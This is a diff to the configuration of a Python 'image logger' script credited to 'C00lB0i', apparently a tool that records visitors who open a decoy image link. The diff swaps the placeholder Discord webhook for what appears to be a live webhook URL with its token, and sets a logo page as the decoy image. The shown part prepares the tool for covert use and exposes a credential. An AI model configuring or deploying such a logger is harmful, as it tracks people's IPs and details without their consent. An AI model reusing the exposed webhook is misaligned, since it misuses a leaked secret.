@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1400328285870751805/LmyYJpEDnpLHoQH7T2iPR0_ltjv3Twg4jxS2dkzXKqvzlQLWn0ehHeXEds6dlzNX811I",
+    "image": "https://www.freepik.com/free-vector/colorful-letter-gradient-logo-design_40158753.htm#fromView=keyword&page=1&position=0&uuid=53048c47-962a-4561-80d1-41cabc20064a&query=Company+logo+jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
